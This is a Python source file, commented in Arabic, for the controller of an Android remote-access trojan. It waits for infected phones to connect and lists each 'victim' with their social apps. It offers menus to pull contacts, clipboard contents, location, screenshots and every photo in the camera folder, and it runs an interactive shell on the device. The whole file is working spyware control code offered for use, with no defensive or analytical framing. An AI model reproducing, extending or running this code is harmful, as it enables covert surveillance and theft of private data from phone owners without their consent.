import socket, os, time
import base64

def print_banner():
    os.system('clear')
    banner = """
    \033[1;33m>>> "The night is dark, the sinners are fast asleep, while the Gnostics stand before the Majestic." <<<
    \033[0m 
    ---------------------------------------------
    \033[0m"""
    print(f"{banner}\n connected devices:")

def recv_all(target, timeout=3.0): # أضفنا timeout هنا كقيمة افتراضية
    full_data = b""
    target.settimeout(timeout) # الآن سيستخدم القيمة الممرة له
    try:
        while True:
            part = target.recv(16384)
            if not part:
                break
            full_data += part
            if b"END_OF_RESULT" in full_data:
                break
    except socket.timeout:
        pass
    except Exception as e:
        print(f"Error: {e}")
    
    final = full_data.decode('utf-8', errors='ignore').replace("END_OF_RESULT", "").strip()
    return final

def color_stat(app_pkg, installed_raw):
    search_term = app_pkg.lower()
    if search_term in installed_raw.lower():
        try:
            # التحقق من الحالة بعد اسم الحزمة
            status_part = installed_raw.lower().split(search_term)[1].split()[0]
            if "yes" in status_part:
                return "\033[1;32mYes\033[0m"
        except:
            return "\033[1;32mYes\033[0m"
    return "\033[1;31mNo\033[0m"

def show_victim_selected_view(model, version, battery, installed_raw):
    print(f"Device: {model} | Android: {version} | Battery: {battery}%\nSocial: WA:{color_stat('whatsapp', installed_raw)} TG:{color_stat('messenger', installed_raw)} FB:{color_stat('katana', installed_raw)} MS:{color_stat('orca', installed_raw)} IG:{color_stat('instagram', installed_raw)} TK:{color_stat('musically', installed_raw)}\n")
    print("[0] show all apps")
    print("[1] show contacts")
    print("[2] dump call logs")
    print("[3] get clipboard")
    print("[4] location")
    print("[5] screenshot")
    print("[6] get camera")
    print("[7] recorder")
    print("[8] ssh\n")
    print("[b] back")

def show_victim_selected(target, address, model, version, battery, installed_raw):
    os.system('clear')
    print(f"Connected to: {address}")
    show_victim_selected_view(model, version, battery, installed_raw)
    
    select = input("---> | ")
    
    if select == "b":
        return

    if select.isdigit():
        select_num = int(select)
        
        if select_num == 0:
            target.send("pm list packages -3\n".encode('utf-8'))
            print("\n[*] جاري جلب تطبيقات الطرف الثالث...")
            apps = recv_all(target)
            print(f"\033[1;32m{apps}\033[0m\n")
            input("Press Enter to continue...")
            show_victim_selected(target, address, model, version, battery, installed_raw)

        elif select_num == 1:
            target.send("GET_CONTACTS\n".encode('utf-8'))
            print("\n[*] جاري سحب الأسماء برمجياً...")
            contacts = recv_all(target)
            print(f"\n\033[1;33m--- [ Victim Contacts ] ---\033[0m\n{contacts}\n")
            input("Press Enter to continue...")
            show_victim_selected(target, address, model, version, battery, installed_raw)

        elif select_num == 3:
            target.send("GET_CLIPBOARD\n".encode('utf-8'))
            print("\n[*] جاري جلب محتوى الحافظة...")
            clip = recv_all(target)
            print(f"\n\033[1;35m--- [ Victim Clipboard ] ---\033[0m\n{clip}\n")
            input("Press Enter to continue...")
            show_victim_selected(target, address, model, version, battery, installed_raw)

        elif select_num == 4:
            target.send("GET_LOCATION\n".encode('utf-8'))
            loc = recv_all(target)
            print(f"\n\033[1;32m--- [ Location ] ---\033[0m\n{loc}\n")
            input("Press Enter to continue...")
            show_victim_selected(target, address, model, version, battery, installed_raw)
            
        elif select_num == 5:
            # الخيار 5: لقطة الشاشة
            print("\n[*] جاري طلب التقاط الشاشة... (قد يستغرق 5 ثوانٍ)")
            target.send("GET_SCREENSHOT\n".encode('utf-8'))
            
            # نستخدم مهلة زمنية أطول قليلاً لأن معالجة الصورة وتحويلها تأخذ وقتاً
            raw_b64 = recv_all(target, timeout=15.0) 
            
            if raw_b64 and "ERROR" not in raw_b64:
                try:
                    filename = f"screenshot_{int(time.time())}.png"
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(raw_b64))
                    print(f"\033[1;32m[+] تم الاستلام بنجاح! تم الحفظ باسم: {filename}\033[0m")
                except Exception as e:
                    print(f"\033[1;31m[-] فشل في معالجة بيانات الصورة: {e}\033[0m")
            else:
                print("\033[1;31m[-] فشل استلام الصورة (تأكد من صلاحيات screencap)\033[0m")
            
            input("\nPress Enter to continue...")
            show_victim_selected(target, address, model, version, battery, installed_raw)

        elif select_num == 6:
            # الخيار 6: سحب الصور المتسلسل (النسخة الاحترافية)
            import re # نحتاج للمكتبة لاستخراج الأرقام بذكاء
            
            print("\n[*] جاري فحص مجلد الكاميرا في جهاز الضحية...")
            target.send("GET_CAMERA_LIST\n".encode('utf-8'))
            
            raw_data = recv_all(target)
            lines = [l for l in raw_data.split('\n') if l.strip()]
            
            if not lines or "ERROR" in raw_data or "No photos" in raw_data:
                print("\033[1;31m[-] فشل في الوصول للمجلد أو لا توجد صور.\033[0m")
            else:
                # استخراج الرقم من السطر الأول حتى لو كان نصاً (مثل TOTAL_PHOTOS: 67)
                first_line = lines[0]
                count_match = re.search(r'\d+', first_line)
                
                if count_match:
                    count = int(count_match.group())
                    # المسارات هي كل السطور المتبقية التي تبدأ بـ /sdcard أو /storage
                    file_paths = [l for l in lines if l.startswith('/')]
                else:
                    print("[-] لم يتم التعرف على بروتوكول البيانات.")
                    file_paths = []

                if not file_paths:
                    print("[-] القائمة فارغة.")
                else:
                    print(f"[+] تم العثور على {len(file_paths)} صورة. بدء النزيف البصري...")
                    
                    # إنشاء مجلد محلي بالـ IP والوقت لعدم التداخل
                    save_dir = f"gallery_{address[0].replace('.', '_')}"
                    if not os.path.exists(save_dir): os.makedirs(save_dir)

                    for i, path in enumerate(file_paths):
                        img_name = path.split('/')[-1]
                        print(f"[{i+1}/{len(file_paths)}] جاري سحب: {img_name} ...", end="\r")
                        
                        # طلب الملف المحدد
                        target.send(f"SEND_FILE:{path}\n".encode('utf-8'))
                        
                        # استقبال بيانات الـ Base64
                        img_b64 = recv_all(target, timeout=30.0) 
                        
                        # تنظيف البيانات من علامة END_OF_RESULT إذا كانت موجودة
                        img_b64 = img_b64.replace("END_OF_RESULT", "").strip()
                        
                        if img_b64 and "ERROR" not in img_b64:
                            try:
                                with open(f"{save_dir}/{img_name}", "wb") as f:
                                    f.write(base64.b64decode(img_b64))
                            except Exception as e:
                                print(f"\n[-] خطأ في حفظ {img_name}: {e}")
                        
                        time.sleep(0.5) # وقت كافٍ لتفريغ البفر وتبريد المعالج
                    
                    print(f"\n\n\033[1;32m[+] اكتمل الاستحواذ! الصور في: {save_dir}\033[0m")
            
            input("\nاضغط Enter للعودة لغرفة التحكم...")
            show_victim_selected(target, address, model, version, battery, installed_raw)


        elif select_num == 8:
            print("\n\033[1;32m[*] Entering Interactive Shell (type 'exit' to close)\033[0m")
            current_path = "/sdcard" 
            while True:
                cmd_input = input(f"\033[1;34m{current_path} $ \033[0m").strip()
                
                if cmd_input.lower() in ['exit', 'quit', 'back']: break
                if not cmd_input: continue

                # معالجة أمر التنقل يدوياً في السيرفر
                if cmd_input.startswith("cd "):
                    new_path = cmd_input.replace("cd ", "").strip()
                    # إذا كان المسار يبدأ بـ / فهو مسار مطلق، وإلا فهو مسار نسبي
                    if new_path.startswith("/"):
                        current_path = new_path
                    else:
                        current_path = os.path.join(current_path, new_path)
                    print(f"Changed path to: {current_path}")
                    continue # لا نرسل cd للهاتف لأننا غيرنا المسار محلياً

                # إرسال الأمر مع إجبار الهاتف على البدء من المسار الحالي
                full_cmd = f"cd {current_path} && {cmd_input}\n"
                target.send(full_cmd.encode('utf-8'))
                
                response = recv_all(target)
                print(f"\n{response}\n")

    else:
        show_victim_selected(target, address, model, version, battery, installed_raw)

def show_sessions():
    while True:
        print_banner()
        for i, v in enumerate(victims):
            print(f" [{i}] {v[1]}")
        print("\n [r] refresh | [q] quit\n")
        
        select = input("---> | ")
        
        if select.isdigit():
            idx = int(select)
            if idx < len(victims):
                target, addr = victims[idx]
                
                # تحديث المعلومات قبل الدخول
                target.send("GET_SMART_INFO\n".encode('utf-8'))
                # انتظار قصير للتأكد من أن الـ Buffer استلم البيانات
                time.sleep(0.5)
                raw = recv_all(target)
                parts = raw.split('|')
                
                if len(parts) >= 4:
                    m, v, b, inst = parts[0], parts[1], parts[2], parts[3]
                else:
                    m, v, b, inst = "Unknown", "??", "0", ""
                
                show_victim_selected(target, addr, m, v, b, inst)
        
        elif select.lower() == 'r': continue
        elif select.lower() == 'q': break

# إعداد السيرفر
ip = '0.0.0.0'
port = 8081
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((ip, port))
server.listen(5)

victims = []

print("[*] Waiting for connections...")
# ملاحظة: في كودك الأصلي كنت تستقبل ضحية واحدة فقط قبل البدء، سأبقيها هكذا لتعمل فوراً
client_socket, address = server.accept()
victims.append((client_socket, address))

show_sessions()
